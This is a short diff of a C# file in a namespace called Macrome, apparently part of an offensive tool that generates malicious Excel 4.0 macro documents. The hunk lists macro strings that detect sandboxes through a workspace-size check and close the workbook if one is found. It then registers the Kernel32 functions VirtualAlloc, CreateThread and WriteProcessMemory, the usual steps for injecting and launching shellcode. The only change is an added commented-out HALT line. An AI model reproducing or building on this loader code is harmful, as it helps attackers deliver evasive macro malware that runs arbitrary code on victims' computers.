@@ -26,6 +26,7 @@ namespace Macrome
             List<string> macros = new List<string>()
             {
                 "=IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)",
+                // "=HALT()",
                 "=REGISTER(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\",\"VA\",,1,0)",
                 "=REGISTER(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",\"CT\",,1,0)",
                 "=REGISTER(\"Kernel32\",\"WriteProcessMemory\",\"JJJCJJ\",\"WPM\",,1,0)",
